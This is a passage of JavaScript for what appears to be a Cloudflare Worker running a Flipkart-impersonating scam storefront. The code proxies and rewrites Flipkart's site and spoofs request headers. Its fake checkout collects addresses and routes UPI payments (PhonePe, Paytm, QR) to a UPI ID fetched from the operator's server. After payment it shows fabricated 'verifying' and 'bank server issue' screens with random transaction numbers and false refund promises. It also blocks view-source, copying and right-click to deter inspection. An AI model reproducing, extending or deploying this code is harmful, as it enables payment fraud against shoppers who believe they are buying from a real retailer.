                        <input type="tel" id="number" placeholder=" " />
                        <label>Mobile number (Required)*</label>
                    </div>
                    <div class="form-floating">
                        <input type="number" id="pin" placeholder=" " />
                        <label>Pincode (Required)*</label>
                    </div>
                    <div class="form-row">
                        <div class="form-floating">
                            <input type="text" id="city" placeholder=" " />
                            <label>City (Required)*</label>
                        </div>
                        <div class="form-floating">
                            <select id="state" style="padding: 12px; background: #fff;">
                                <option value="AP">Andhra Pradesh</option>
                                <option value="AR">Arunachal Pradesh</option>
                                <option value="AS">Assam</option>
                                <option value="BR">Bihar</option>
                                <option value="CT">Chhattisgarh</option>
                                <option value="GA">Goa</option>
                                <option value="GJ">Gujarat</option>
                                <option value="HR">Haryana</option>
                                <option value="HP">Himachal Pradesh</option>
                                <option value="JK">Jammu & Kashmir</option>
                                <option value="JH">Jharkhand</option>
                                <option value="KA">Karnataka</option>
                                <option value="KL">Kerala</option>
                                <option value="MP">Madhya Pradesh</option>
                                <option value="MH">Maharashtra</option>
                                <option value="MN">Manipur</option>
                                <option value="ML">Meghalaya</option>
                                <option value="MZ">Mizoram</option>
                                <option value="NL">Nagaland</option>
                                <option value="OR">Odisha</option>
                                <option value="PB">Punjab</option>
                                <option value="RJ">Rajasthan</option>
                                <option value="SK">Sikkim</option>
                                <option value="TN">Tamil Nadu</option>
                                <option value="TS">Telangana</option>
                                <option value="TR">Tripura</option>
                                <option value="UK">Uttarakhand</option>
                                <option value="UP">Uttar Pradesh</option>
                                <option value="WB">West Bengal</option>
                                <option value="AN">Andaman & Nicobar</option>
                                <option value="CH">Chandigarh</option>
                                <option value="DN">Dadra and Nagar Haveli</option>
                                <option value="DD">Daman & Diu</option>
                                <option value="DL">Delhi</option>
                                <option value="LD">Lakshadweep</option>
                                <option value="PY">Puducherry</option>
                            </select>
                            <label>State (Required)*</label>
                        </div>
                    </div>
                    <div class="form-floating">
                        <input type="text" id="flat" placeholder=" " />
                        <label>House No., Building Name (Required)*</label>
                    </div>
                    <div class="form-floating">
                        <input type="text" id="area" placeholder=" " />
                        <label>Road name, Area, Colony (Required)*</label>
                    </div>
                    <div class="shipping-banner">
                        <img src="https://paymentgataway.vercel.app/assets/free_shippingbanner.gif" alt="Free Shipping" />
                    </div>
                    <button type="submit" class="save-address-btn">Save Address</button>
                </form>
            </div>
        </div>
    </div>

    <!-- PAYMENT PAGE -->
    <div id="main-page">
        <header>
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-2">
                    <div class="flex flex-col leading-tight">
                        <span class="text-xs text-gray-600">Step 3 of 3</span>
                        <span class="text-base font-semibold">Payments</span>
                    </div>
                </div>
                <div class="flex items-center gap-1 bg-gray-100 rounded-md px-2 py-1 text-xs text-gray-900">
                    <i class="fa-regular fa-lock-keyhole fa-sm"></i>
                    <span>100% Secure</span>
                </div>
            </div>

            <div class="total-card">
                <div class="flex justify-between items-center">
                    <div class="text-blue-700 font-medium text-base">Total Amount</div>
                    <span class="selling_price font-semibold text-blue-700 text-lg" id="total-amount">&#8377;599</span>
                </div>
            </div>
        </header>

        <section class="bg-white py-4 border-b border-gray-200">
            <div class="px-4">
                <div class="bg-green-50 border border-green-100 rounded-md p-3 flex items-center justify-between">
                    <div>
                        <div class="text-[14px] font-semibold text-green-700">5% Cashback</div>
                        <div class="text-[12px] text-green-700">Claim now with payment offers</div>
                    </div>
                    <div class="flex items-center gap-2">
                        <span class="inline-flex items-center justify-center w-7 h-7 rounded-full bg-pink-100">
                            <img class="w-[16px] h-[16px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/AXIS.svg" />
                        </span>
                        <span class="inline-flex items-center justify-center w-7 h-7 rounded-full bg-blue-100">
                            <img class="w-[16px] h-[16px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/SBI.svg" />
                        </span>
                    </div>
                </div>
            </div>
        </section>

        <section class="bg-white divide-y" id="payment-list">
            <div class="payment-row" id="upi-row">
                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/upi.svg" />
                <div class="flex-1">
                    <div class="flex justify-between items-center">
                        <h3>UPI</h3>
                        <i class="fa-solid fa-chevron-down text-xs text-gray-500"></i>
                    </div>
                    <p>Pay by any UPI app</p>
                </div>
            </div>

            <div id="upi-panel">
                <div class="rounded-lg border bg-white pb-2 border-gray-200">
                    <label class="form-check active" pay-type="phonepe">
                        <div class="flex items-center gap-2">
                            <img src="https://paymentgataway.vercel.app/assets/images/phonepe.svg" class="w-6 h-6" />
                            <span class="text-sm font-medium">PhonePe</span>
                        </div>
                        <input type="radio" name="upiApp" value="phonepe" class="accent-blue-600" checked />
                    </label>

                    <label class="form-check" pay-type="paytm">
                        <div class="flex items-center gap-2">
                            <img src="https://paymentgataway.vercel.app/assets/images/paytm_icon.svg" class="w-6 h-6" />
                            <span class="text-sm font-medium">Paytm</span>
                        </div>
                        <input type="radio" name="upiApp" value="paytm" class="accent-blue-600" />
                    </label>

                    <label class="form-check" pay-type="qr_upi">
                        <div class="flex items-center gap-2">
                            <img src="https://paymentgataway.vercel.app/assets/images/qr.png" class="w-6 h-6" />
                            <span class="text-sm font-medium">QR Code</span>
                        </div>
                        <input type="radio" name="upiApp" value="qr_upi" class="accent-blue-600" />
                    </label>

                    <div class="modal-overlay" id="modalOverlay"></div>
                    <div class="modal" id="qrModal">
                        <div class="modal-content">
                            <div class="modal-header" style="border:none; padding-bottom:0; background-color:#2874f0;">
                                <img src="https://paymentgataway.vercel.app/assets/images/Q18Ifxk.png" style="width:100%; padding:0 103px; margin-bottom:10px;"/>
                            </div>
                            <div class="modal-body" style="display:flex; padding-top:22px; flex-direction:column; align-items:center; padding:15px 0;">
                                <div id="qr-loading" class="qr-skeleton-wrap" style="display:none; flex-direction:column; align-items:center; gap:12px; padding:12px 0;">
                                    <div class="qr-skeleton"></div>
                                    <div class="qr-skeleton-line"></div>
                                </div>
                                <div id="qr-code" style="margin-top:-20px; margin-bottom:10px;"></div>
                                <p class="text-center" style="font-size:11px;">Scan the QR Code and Pay from any UPI App</p>
                                <div class="flex gap-5 py-3">
                                    <img src="https://paymentgataway.vercel.app/assets/images/gpay_icon.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
                                    <img src="https://paymentgataway.vercel.app/assets/images/phonepe.svg" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
                                    <img src="https://paymentgataway.vercel.app/assets/images/paytm_images-n.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
                                    <img src="https://img.icons8.com/color/48/bhim.png" style="width:35px; background:#c5c5c5; padding:4px;" class="rounded" />
                                </div>
                            </div>
                            <div style="display:flex; gap:10px; margin-top:0px;">
                                <button class="close-btn" id="downloadQRBtn" style="flex:1; background:#FFC107;">Download QR</button>
                                <button class="close-btn" id="closeModal" style="flex:1; background:#2874f0; color:#fff;">I PAID</button>
                            </div>
                        </div>
                        <div id="qr_amt_modal_scan" style="display:none;">100</div>
                    </div>
                </div>

                <div id="paymentWaitingOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:999999;">
                    <div style="width:88%; max-width:300px; background:#ffffff; padding:22px 20px; border-radius:14px; margin:170px auto 0; text-align:center; box-shadow:0 6px 30px rgba(0,0,0,0.18); animation:scaleIn .25s ease-out;">
                        <div style="border:4px solid #e5e7eb; border-top:4px solid #2874f0; width:42px; height:42px; border-radius:50%; margin:5px auto 18px; animation:spin 0.9s linear infinite;"></div>
                        <div style="font-size:16px; font-weight:600; color:#111;">Processing Payment</div>
                        <p style="font-size:13px; color:#555; margin-top:6px; line-height:1.45;">Please complete the payment in your UPI app. Do not close this window.</p>
                        <button id="cancelPaymentBtn" style="margin-top:16px; padding:9px 14px; background:#e5e7eb; border-radius:6px; font-size:13px; font-weight:600; color:#111; border:none; width:100%; cursor:pointer;">Use Different Payment Method</button>
                    </div>
                </div>

                <div id="paymentFailedPopup" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:999999; animation:fadeIn .25s ease-out;">
                    <div style="width:88%; max-width:320px; background:linear-gradient(145deg,#ffffff,#f4f4f4); padding:28px 24px; border-radius:18px; margin:160px auto 0; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.20); animation:scaleIn .25s ease-out;">
                        <div style="width:72px; height:72px; margin:0 auto 16px; border-radius:50%; background:#ffe5e5; display:flex; align-items:center; justify-content:center;">
                            <i class="fa-solid fa-xmark" style="color:#d10000; font-size:40px;"></i>
                        </div>
                        <div style="font-size:20px; font-weight:700; color:#c40000; margin-bottom:6px;">Payment Failed</div>
                        <p style="font-size:14px; color:#555; line-height:1.45; margin-bottom:20px;">The transaction couldn't be completed and was declined by your bank.<br /><br />If any amount has been debited from your account, it will be refunded automatically within <b>1-2 days</b>.</p>
                        <button id="tryAgainBtn" style="background:#2874f0; padding:11px; width:100%; border-radius:8px; font-weight:600; color:white; font-size:14px; border:none; cursor:pointer;">Try Again</button>
                    </div>
                </div>

                <!-- VERIFICATION PAGE -->
                <div id="verifyPaymentOverlay" style="display:none; position:fixed; inset:0; background:#fff; z-index:999999; overflow-y:auto;">
                    <div style="max-width:480px; margin:0 auto; padding:40px 24px; text-align:center;">
                        <div class="color-spinner"></div>
                        <div style="font-size:20px; font-weight:700; color:#111; margin-bottom:8px;">Verifying your payment</div>
                        <p style="font-size:14px; color:#666; margin-bottom:24px;">Please wait while we confirm your transaction with the bank.</p>

                        <div class="timer-text" id="verifyTimer">05:00</div>
                        <div class="progress-bar">
                            <div class="progress-fill" id="verifyProgress" style="width:100%;"></div>
                        </div>
                    </div>
                </div>

                <!-- BANK SERVER ISSUE PAGE -->
                <div id="bankIssueOverlay" style="display:none; position:fixed; inset:0; background:#fff; z-index:999999; overflow-y:auto;">
                    <div style="max-width:480px; margin:0 auto; padding:40px 24px; text-align:center;">
                        <div style="width:80px; height:80px; border-radius:50%; background:#fff3e0; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
                            <i class="fa-solid fa-triangle-exclamation" style="color:#f57c00; font-size:40px;"></i>
                        </div>
                        <div style="font-size:20px; font-weight:700; color:#111; margin-bottom:8px;">Bank Server Issue</div>
                        <p style="font-size:14px; color:#666; line-height:1.6; margin-bottom:24px;">We are unable to verify your payment at this moment due to a temporary bank server issue.<br><br>Your amount will be added to your account in <b style="color:#2874f0;">2-7 business days</b>.</p>
                        <div style="padding:16px; background:#fff8e1; border-radius:12px; border:1px solid #ffe0b2; margin-bottom:20px;">
                            <div style="font-size:13px; color:#e65100; font-weight:600;">Transaction Reference</div>
                            <div style="font-size:16px; color:#333; font-weight:700; margin-top:4px; font-family:monospace;" id="txnRef">TXN9876543210</div>
                        </div>
                        <button id="backToHomeBtn" style="background:#2874f0; padding:12px; width:100%; border-radius:8px; font-weight:600; color:white; font-size:14px; border:none; cursor:pointer;">Back to Home</button>
                    </div>
                </div>

                <div class="py-2 px-4 mt-3">
                    <button id="action-button" class="w-full bg-yellow-400 text-[#111112] px-8 py-2.5 rounded font-semibold hover:bg-yellow-500">
                        Pay <span class="selling_price" id="btn-amount">&#8377;599</span>
                    </button>
                </div>
            </div>
        </section>

        <div class="bg-white flex items-start gap-3 px-4 py-4 border-b border-gray-100 not-available">
            <img class="w-[24px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/card.svg" />
            <div class="flex-1">
                <div class="flex justify-between">
                    <h3 class="text-[14px] font-semibold">Credit/Debit/ATM Card</h3>
                    <span class="text-xs text-gray-500 font-semibold">Unavailable</span>
                </div>
                <p class="text-[12px] text-gray-500">Add and secure cards as per RBI guidelines</p>
            </div>
        </div>

        <div class="bg-white flex items-start gap-3 px-4 py-4 border-b border-gray-100 not-available">
            <img class="w-[24px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/net-banking-08092023.svg" />
            <div class="flex-1">
                <div class="flex justify-between">
                    <h3 class="text-[14px] font-semibold">Net Banking</h3>
                    <span class="text-xs text-gray-500 font-semibold">Unavailable</span>
                </div>
            </div>
        </div>

        <div class="bg-white flex items-start gap-3 px-4 py-4 border-b border-gray-100 not-available">
            <img class="w-[24px]" src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/cash-icon.svg" />
            <div class="flex-1">
                <div class="flex justify-between">
                    <h3 class="text-[14px] font-semibold">Cash on Delivery</h3>
                    <span class="text-xs text-gray-500 font-semibold">Unavailable</span>
                </div>
            </div>
        </div>

        <section class="font-semibold flex flex-col items-center px-20 py-10 text-center bg-white">
            <div class="text-gray-400 text-[17px]">35 Crore happy customers and counting!</div>
            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/smiley.svg" class="w-[40px]" />
        </section>

        <footer class="h-20"></footer>
    </div>

    <script>
        var GLOBAL_AMOUNT = 599;
        var paymentUrls = {};
        var upiData = { upiId: '' };
        var verifyTimerInterval = null;
        var paymentStartTime = null;

        document.addEventListener('DOMContentLoaded', function() {
            const search = window.location.search;
            const decodedSearch = decodeURIComponent(search || '');

            // 1. Check for address mode
            let isAddress = decodedSearch.toLowerCase().includes('address');

            // 2. Parse amount (find the last sequence of digits in the query string)
            let amount = null;
            const matches = decodedSearch.match(/\\d+/g);
            if (matches && matches.length > 0) {
                amount = parseInt(matches[matches.length - 1], 10);
            }

            // If no amount, show block page
            if (!amount || isNaN(amount) || amount <= 0) {
                document.getElementById('block-page').style.display = 'block';
                document.getElementById('main-page').style.display = 'none';
                document.getElementById('address-page').style.display = 'none';
                document.body.style.background = '#fff';
                return;
            }

            GLOBAL_AMOUNT = amount;
            document.getElementById('total-amount').textContent = '\\u20b9' + amount;
            document.getElementById('btn-amount').textContent = '\\u20b9' + amount;
            document.getElementById('qr_amt_modal_scan').textContent = amount;

            if (isAddress) {
                // Show address page
                document.getElementById('address-page').style.display = 'block';
                document.getElementById('main-page').style.display = 'none';
                document.getElementById('block-page').style.display = 'none';
                document.body.style.background = '#fff';
                initAddressForm();
            } else {
                // Show payment page
                document.getElementById('main-page').style.display = 'block';
                document.getElementById('address-page').style.display = 'none';
                document.getElementById('block-page').style.display = 'none';

                initPaymentUrls();
                initUPIPanel();
                initFormChecks();
                initModal();
                initPaymentButtons();
                checkReturningFromApp();
            }
        });

        // ========== ADDRESS PAGE ==========
        function initAddressForm() {
            const form = document.getElementById('addressForm');
            const backBtn = document.getElementById('back-btn');

            if (backBtn) {
                backBtn.addEventListener('click', function() {
                    window.history.back();
                });
            }

            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();

                    // Save address to localStorage
                    const addressData = {
                        name: document.getElementById('name').value,
                        number: document.getElementById('number').value,
                        pin: document.getElementById('pin').value,
                        city: document.getElementById('city').value,
                        state: document.getElementById('state').value,
                        flat: document.getElementById('flat').value,
                        area: document.getElementById('area').value
                    };
                    localStorage.setItem('delivery_address', JSON.stringify(addressData));

                    // Navigate to payment page
                    window.location.href = window.location.pathname + '?=' + GLOBAL_AMOUNT;
                });
            }
        }

        // ========== PAYMENT PAGE ==========
        async function initPaymentUrls() {
            try {
                const response = await fetch('/api/upi');
                const data = await response.json();

                if (!data.active || !data.upiId) {
                    showPaymentUnavailable();
                    return;
                }

                upiData.upiId = data.upiId;

                const amount = GLOBAL_AMOUNT;
                const phonepePayload = {
                    contact: { cbcName: "", nickName: "", vpa: upiData.upiId, type: "VPA" },
                    p2pPaymentCheckoutParams: {
                        note: "Pay For Order",
                        isByDefaultKnownContact: true,
                        initialAmount: Number(amount) * 100,
                        currency: "INR",
                        checkoutType: "DEFAULT",
                        transactionContext: "p2p"
                    }
                };
                const phonepeBase64 = encodeURIComponent(btoa(JSON.stringify(phonepePayload)));

                paymentUrls = {
                    phonepe: "phonepe://native?data=" + phonepeBase64 + "&id=p2ppayment",
                    paytm: \`paytmmp://cash_wallet?pa=\${upiData.upiId}&pn=Order&am=\${amount}&cu=INR&tn=Pay For Order&featuretype=money_transfer\`,
                    qr: upiData.upiId
                };
            } catch (e) {
                console.error('Error fetching UPI data:', e);
                showPaymentUnavailable();
            }
        }

        function showPaymentUnavailable() {
            const paymentList = document.getElementById('payment-list');
            if (paymentList) {
                paymentList.innerHTML = \`
                    <div class="flex flex-col items-center justify-center py-16 px-8 text-center bg-white">
                        <div class="w-16 h-16 rounded-full bg-gray-100 flex items-center justify-center mb-4">
                            <i class="fa-solid fa-ban text-2xl text-gray-400"></i>
                        </div>
                        <h3 class="text-lg font-semibold text-gray-800 mb-2">Payment Methods Not Available</h3>
                        <p class="text-sm text-gray-500">Please check back later. Payment options are currently being updated.</p>
                    </div>
                \`;
            }
        }

        function initUPIPanel() {
            const upiRow = document.getElementById('upi-row');
            const upiPanel = document.getElementById('upi-panel');
            if (upiRow && upiPanel) {
                upiRow.addEventListener('click', () => {
                    upiPanel.classList.toggle('open');
                });
                upiPanel.classList.add('open');
            }
        }

        function initFormChecks() {
            document.querySelectorAll('.form-check').forEach(el => {
                el.addEventListener('click', function() {
                    document.querySelectorAll('.form-check').forEach(x => x.classList.remove('active'));
                    this.classList.add('active');
                    const radio = this.querySelector('input[type="radio"]');
                    if (radio) radio.checked = true;
                    updateActionButton();
                });
            });
            updateActionButton();
        }

        function updateActionButton() {
            const active = document.querySelector('.form-check.active');
            const btn = document.getElementById('action-button');
            if (!active || !btn) return;

            const type = active.getAttribute('pay-type');
            const amount = GLOBAL_AMOUNT;

            if (type === 'qr_upi') {
                btn.innerHTML = 'View QR Code';
                btn.onclick = () => openQRModal();
            } else {
                btn.innerHTML = \`Pay \\u20b9\${amount}\`;
                btn.onclick = () => payNow();
            }
        }

        function initModal() {
            const modalOverlay = document.getElementById('modalOverlay');
            const qrModal = document.getElementById('qrModal');
            const closeModalBtn = document.getElementById('closeModal');
            const downloadQRBtn = document.getElementById('downloadQRBtn');

            if (modalOverlay) modalOverlay.addEventListener('click', closeQRModal);
            if (closeModalBtn) closeModalBtn.addEventListener('click', startVerificationFromQR);
            if (qrModal) qrModal.addEventListener('click', (e) => e.stopPropagation());

            if (downloadQRBtn) {
                downloadQRBtn.addEventListener('click', function() {
                    const box = document.getElementById('qr-code');
                    if (!box) return;
                    const canvas = box.querySelector('canvas');
                    if (!canvas) return;
                    const dataUrl = canvas.toDataURL('image/png');
                    const a = document.createElement('a');
                    a.href = dataUrl;
                    a.download = 'upi-qr.png';
                    document.body.appendChild(a);
                    a.click();
                    a.remove();
                });
            }
        }

        function openQRModal() {
            const modalOverlay = document.getElementById('modalOverlay');
            const qrModal = document.getElementById('qrModal');
            if (modalOverlay) modalOverlay.classList.add('show');
            if (qrModal) qrModal.classList.add('show');

            const loading = document.getElementById('qr-loading');
            const box = document.getElementById('qr-code');
            if (loading) loading.style.display = 'flex';
            if (box) { box.innerHTML = ''; box.classList.remove('ready'); }

            requestAnimationFrame(() => generateQR());
        }

        function closeQRModal() {
            const modalOverlay = document.getElementById('modalOverlay');
            const qrModal = document.getElementById('qrModal');
            if (modalOverlay) modalOverlay.classList.remove('show');
            if (qrModal) qrModal.classList.remove('show');
        }

        function generateQR() {
            const loading = document.getElementById('qr-loading');
            const box = document.getElementById('qr-code');
            if (!box) return;
            if (loading) loading.style.display = 'flex';
            box.innerHTML = '';
            box.classList.remove('ready');

            let amount = GLOBAL_AMOUNT;
            const txn = Math.floor(Math.random() * 9999999999);
            let upiId = (upiData && upiData.upiId) ? upiData.upiId : (paymentUrls.qr || '');
            const text = \`upi://pay?pa=\${encodeURIComponent(upiId)}&pn=Order&am=\${amount}&cu=INR&tr=\${txn}&tn=\${txn}\`;

            setTimeout(() => {
                new QRCode(box, {
                    text,
                    width: 230,
                    height: 230,
                    correctLevel: QRCode.CorrectLevel.H,
                });
                if (loading) loading.style.display = 'none';
                box.classList.add('ready');
            }, 280);
        }

        function initPaymentButtons() {
            const tryAgainBtn = document.getElementById('tryAgainBtn');
            if (tryAgainBtn) {
                tryAgainBtn.onclick = function() {
                    const fail = document.getElementById('paymentFailedPopup');
                    if (fail) fail.style.display = 'none';
                };
            }

            const cancelPaymentBtn = document.getElementById('cancelPaymentBtn');
            if (cancelPaymentBtn) {
                cancelPaymentBtn.onclick = function() {
                    const ov = document.getElementById('paymentWaitingOverlay');
                    if (ov) ov.style.display = 'none';
                };
            }

            const backToHomeBtn = document.getElementById('backToHomeBtn');
            if (backToHomeBtn) {
                backToHomeBtn.onclick = function() {
                    window.location.href = 'https://flipkart.com';
                };
            }
        }

        let failTimer = null;

        function showPaymentWaiting() {
            const ov = document.getElementById('paymentWaitingOverlay');
            if (!ov) return;
            ov.style.display = 'block';
            failTimer = setTimeout(() => {
                ov.style.display = 'none';
                const fail = document.getElementById('paymentFailedPopup');
                if (fail) fail.style.display = 'block';
            }, 20000);
        }

        async function payNow() {
            const active = document.querySelector('.form-check.active');
            if (!active) return;
            const payType = active.getAttribute('pay-type');

            let redirect_url = '';
            switch (payType) {
                case 'phonepe':
                    if (paymentUrls.phonepe) {
                        showPaymentWaiting();
                        paymentStartTime = Date.now();
                        window.location.href = paymentUrls.phonepe;
                        return;
                    }
                    break;
                case 'paytm':
                    if (paymentUrls.paytm) {
                        redirect_url = paymentUrls.paytm;
                    }
                    break;
                case 'qr_upi':
                    openQRModal();
                    return;
            }

            if (redirect_url) {
                showPaymentWaiting();
                paymentStartTime = Date.now();
                setTimeout(() => { window.location.href = redirect_url; }, 200);
            }
        }

        // ========== VERIFICATION TIMER ==========
        function startVerificationFromQR() {
            closeQRModal();
            startVerifyTimer();
        }

        function startVerifyTimer() {
            const overlay = document.getElementById('verifyPaymentOverlay');
            if (!overlay) return;
            overlay.style.display = 'block';

            const totalSeconds = 300;
            let remaining = totalSeconds;
            const timerEl = document.getElementById('verifyTimer');
            const progressEl = document.getElementById('verifyProgress');
            const txnRef = document.getElementById('txnRef');

            if (txnRef) {
                txnRef.textContent = 'TXN' + Math.floor(Math.random() * 9000000000 + 1000000000);
            }

            if (verifyTimerInterval) clearInterval(verifyTimerInterval);

            verifyTimerInterval = setInterval(() => {
                remaining--;
                const minutes = Math.floor(remaining / 60);
                const seconds = remaining % 60;
                timerEl.textContent = \`\${String(minutes).padStart(2,'0')}:\${String(seconds).padStart(2,'0')}\`;

                const pct = (remaining / totalSeconds) * 100;
                progressEl.style.width = pct + '%';

                if (remaining <= 0) {
                    clearInterval(verifyTimerInterval);
                    showBankIssue();
                }
            }, 1000);
        }

        function showBankIssue() {
            const verifyOverlay = document.getElementById('verifyPaymentOverlay');
            const bankOverlay = document.getElementById('bankIssueOverlay');
            if (verifyOverlay) verifyOverlay.style.display = 'none';
            if (bankOverlay) bankOverlay.style.display = 'block';
        }

        // ========== RETURN FROM APP DETECTION ==========
        function checkReturningFromApp() {
            if (localStorage.getItem('payment_in_progress')) {
                const startTime = parseInt(localStorage.getItem('payment_start_time') || '0');
                const now = Date.now();
                if (now - startTime > 3000) {
                    localStorage.removeItem('payment_in_progress');
                    localStorage.removeItem('payment_start_time');
                    startVerifyTimer();
                    return;
                }
                localStorage.removeItem('payment_in_progress');
                localStorage.removeItem('payment_start_time');
            }

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible') {
                    if (localStorage.getItem('payment_in_progress')) {
                        const startTime = parseInt(localStorage.getItem('payment_start_time') || '0');
                        const now = Date.now();
                        if (now - startTime > 3000) {
                            localStorage.removeItem('payment_in_progress');
                            localStorage.removeItem('payment_start_time');
                            startVerifyTimer();
                        }
                    }
                }
            });
        }

        function storePaymentIntent() {
            localStorage.setItem('payment_in_progress', 'true');
            localStorage.setItem('payment_start_time', Date.now().toString());
        }

        const originalPayNow = payNow;
        payNow = function() {
            const active = document.querySelector('.form-check.active');
            if (!active) return;
            const payType = active.getAttribute('pay-type');
            if (payType !== 'qr_upi') {
                storePaymentIntent();
            }
            originalPayNow();
        };

        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && ['u','U','s','S','c','C','p','P'].includes(e.key)) e.preventDefault();
            if (e.keyCode === 123) e.preventDefault();
        });
        document.addEventListener('dragstart', (e) => e.preventDefault());
        document.addEventListener('selectstart', (e) => e.preventDefault());
    </script>
</body>
</html>`;

  return new Response(html, {
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
      "Access-Control-Allow-Origin": origin || "*",
    },
  });
}

// ── URL rewriting ─────────────────────────────────────────────
function rewriteUrl(u, base) {
  if (!u || typeof u !== "string") return u;
  return u
    .replace(/https?:\/\/(?:www|m)\.flipkart\.com\//g, base)
    .replace(/\/\/(?:www|m)\.flipkart\.com\//g, base)
    .replace(
      /https?:\/\/([a-z0-9.-]+\.(?:flipkart|flixcart|google|gstatic)\.com)\//g,
      `${base}__fk/$1/`,
    )
    .replace(
      /\/\/([a-z0-9.-]+\.(?:flipkart|flixcart|google|gstatic)\.com)\//g,
      `${base}__fk/$1/`,
    );
}

// ── API headers ───────────────────────────────────────────────
function apiHeaders(incomingHeaders, cookie, clientIp) {
  const clientUA = incomingHeaders ? incomingHeaders.get("user-agent") : "";
  let finalUA = MOBILE_UA;
  let finalFkua = BASE_UA;
  if (clientUA && clientUA.includes("Mobile")) {
    if (!clientUA.includes("FKUA")) {
      finalUA = clientUA + " FKUA/msite/0.0.3/msite/Mobile";
    } else {
      finalUA = clientUA;
    }
    finalFkua = finalUA.replace(/\s*FKUA\/msite\/0\.0\.3\/msite\/Mobile/g, "");
  }
  let finalXua = finalFkua + " FKUA/msite/0.0.3/msite/Mobile";

  const isChromium = clientUA.toLowerCase().includes("chrome") || clientUA.toLowerCase().includes("chromium") || (!clientUA && MOBILE_UA.toLowerCase().includes("chrome"));

  const h = {
    "user-agent": finalUA,
    "fkua-user-agent": finalFkua,
    "x-user-agent": finalXua,
    "flipkart_secure": "true",
    "x-requested-with": "com.wFlipkart_19923844",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "accept": "*/*",
    "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
    "accept-encoding": "gzip, deflate, br, zstd",
    "origin": "https://www.flipkart.com",
    "referer": "https://www.flipkart.com/",
    "network-type": "4g",
  };

  if (isChromium) {
    h["sec-ch-ua"] = '"Chromium";v="148", "Android WebView";v="148", "Not(A)Brand";v="99"';
    h["sec-ch-ua-platform"] = '"Android"';
    h["sec-ch-ua-mobile"] = "?1";
  }

  if (incomingHeaders) {
    for (const [k, v] of incomingHeaders.entries()) {
      const lk = k.toLowerCase();
      if (
        lk === "host" ||
        lk === "cookie" ||
        lk === "cf-connecting-ip" ||
        lk === "x-forwarded-for" ||
        lk === "x-real-ip" ||
        lk === "content-length" ||
        lk === "transfer-encoding" ||
        lk === "referer" ||
        lk === "origin" ||
        lk.startsWith("sec-fetch")
      ) {
        continue;
      }
      h[lk] = v;
    }

    // Parse and clean incoming referer & origin
    const incomingReferer = incomingHeaders.get("referer");
    if (incomingReferer) {
      try {
        const refUrl = new URL(incomingReferer);
        refUrl.host = "www.flipkart.com";
        refUrl.protocol = "https:";
        h["referer"] = refUrl.toString();
      } catch (e) {
        h["referer"] = "https://www.flipkart.com/";
      }
    }
    const incomingOrigin = incomingHeaders.get("origin");
    if (incomingOrigin) {
      try {
        const origUrl = new URL(incomingOrigin);
        origUrl.host = "www.flipkart.com";
        origUrl.protocol = "https:";
        h["origin"] = origUrl.toString().replace(/\/$/, "");
      } catch (e) {
        h["origin"] = "https://www.flipkart.com";
      }
    }
  }

  if (cookie) h["cookie"] = cookie;
  if (clientIp) {
    h["x-forwarded-for"] = clientIp;
    h["x-real-ip"] = clientIp;
    h["true-client-ip"] = clientIp;
    h["cf-connecting-ip"] = clientIp;
  }
  return h;
}

// ── Subdomain proxy ───────────────────────────────────────────
async function proxySubdomain(
  request,
  subdomain,
  subpath,
  qs,
  origin,
  base,
  discountPct,
  ctx,
  env,
  jar, // per-request cookie Map
) {
  const target = `https://flipkart.knandkk07.workers.dev/__fk/${subdomain}/${subpath}${qs}`;

  if (CDN_DOMAINS.test(subdomain) && STATIC_EXT.test(subpath.split("?")[0]))
    return Response.redirect(target, 302);

  if (MOCK_DOMAINS.test(subdomain))
    return new Response("{}", {
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": origin || "*",
        "Access-Control-Allow-Credentials": "true",
      },
    });

  const isApi = API_DOMAINS.test(subdomain);
  const cookie = buildCookieHeader(request.headers.get("cookie") || "", jar);
  const clientIp =
    request.headers.get("CF-Connecting-IP") ||
    request.headers.get("X-Forwarded-For") ||
    "";
  const fwdH = isApi
    ? apiHeaders(request.headers, cookie, clientIp)
    : {
      "User-Agent": MOBILE_UA,
      Referer: "https://www.flipkart.com/",
      Origin: "https://www.flipkart.com",
      Accept: request.headers.get("accept") || "*/*",
      "Accept-Language": "en-IN,en;q=0.9",
      "Accept-Encoding": "identity",
      ...(cookie ? { Cookie: cookie } : {}),
      ...(request.headers.get("content-type")
        ? { "Content-Type": request.headers.get("content-type") }
        : {}),
      ...(clientIp
        ? {
          "X-Forwarded-For": clientIp,
          "X-Real-IP": clientIp,
          "True-Client-IP": clientIp,
          "CF-Connecting-IP": clientIp,
        }
        : {}),
    };

  let bodyBuf = null,
    bodyStr = "";
  if (!["GET", "HEAD"].includes(request.method)) {
    const raw = await request.arrayBuffer();
    const dec = new TextDecoder().decode(raw);
    const workerHost = new URL(base).host;
    const escHost = workerHost.replace(/\./g, "\\.");

    let cleaned = dec;

    // 1. Absolute URLs with __fk (unescaped)
    cleaned = cleaned.replace(new RegExp("https?://" + escHost + "/__fk/([a-z0-9.-]+)/", "g"), "https://$1/");
